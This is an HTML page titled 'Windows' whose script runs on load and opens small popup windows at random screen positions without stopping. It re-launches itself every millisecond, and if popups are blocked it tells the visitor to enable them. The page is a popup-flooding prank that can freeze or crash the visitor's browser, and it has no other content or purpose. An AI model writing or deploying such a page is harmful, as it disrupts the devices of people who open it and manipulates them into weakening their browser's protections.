<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Windows</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: url('https://steamuserimages-a.akamaihd.net/ugc/869617511819600290/DD1A254341A979D0B1BC78F68EBFF59BD5562982/?imw=1024&imh=768&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true') no-repeat center center fixed;
            background-size: cover;
        }
    </style>
    <script>
        function openWindow() {
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const randomX = Math.floor(Math.random() * screenWidth);
            const randomY = Math.floor(Math.random() * screenHeight);

            const newWindow = window.open(
                "https://button360.github.io/380",
                "_blank",
                `width=200,height=150,scrollbars=yes,resizable=yes,left=${randomX},top=${randomY}`
            );

            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
                alert("Pop-ups are blocked. Please enable pop-ups for this site to continue.");
            } else {
                setTimeout(openWindow, 1);
            }
        }

        window.onload = openWindow;
    </script>
</head>
<body></body>
</html>
